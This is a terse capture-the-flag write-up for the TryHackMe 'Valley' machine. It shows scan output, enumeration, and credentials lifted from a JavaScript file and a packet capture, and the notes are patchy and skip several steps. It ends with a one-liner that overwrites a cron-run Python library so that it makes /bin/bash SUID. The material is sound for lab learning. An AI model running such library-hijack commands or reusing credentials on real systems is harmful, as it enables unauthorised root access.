---
title: "Valley"
date: 2023-09-14 17:00:00 +500
categories: [THM, easy machines]
tags: [] 
---

<style>
  p {
    text-align: justify;
  }
</style>


10.10.211.240


quick nmap scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown
```

more detailed nmap scan to see whats running on that port nmap -sV -p22,80,37370 10.10.211.240

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
```

the webpage appears to be a photography company 


lets enumerate the website.

gobuster

```
```

static is a listing of files?

further enum on that

/00 found

```
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
```

posible username `valleyDev`, 


login page under `/dev1243224123123`

lets check the source code first, and in the dev.js file theres a lot of useful information, we get how the login is proccesed and the credentials

```
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
```

we get that potencially the credentials we used could be used on the ftp server or the ssh

so lets try connect, remeber that the ftp server is on a different port so it'll be


```
ftp <IP> <PORT>
```

and we get access!

inside theres 3 log files?
```
-rw-rw-r--    1 1000     1000         7272 Mar 06  2023 siemFTP.pcapng
-rw-rw-r--    1 1000     1000      1978716 Mar 06  2023 siemHTTP1.pcapng
-rw-rw-r--    1 1000     1000      1972448 Mar 06  2023 siemHTTP2.pcapng
```


lets see the packets

the ftp file shows that anonymous login was available

http1 i dunno

htpp2 - filter out by http - get the form credentials

```
Form item: "uname" = "valleyDev"
Form item: "psw" = "ph0t0s1234"
```


   
i tried to login to the website, but i couldnt, anyways it was expected since the code only works for 1 credential and it wasnt it, so ill try to login to the ssh.



and we get access, now we have the user flag under user.txt

> THM{******************}

now lets enum for files and directories
      

and we have an executable on the /home directory, its executes a login function, i tried both credentials, but it didnt worked.

i'll get it on my machine using python server and exam it 


liberty123
login to valley


crontab

/usr/lib/python3.8/base64.py


`echo "import os;os.system('chmod u+s /bin/bash')" > /usr/lib/python3.8/base64.py`

> THM{*******************************}
      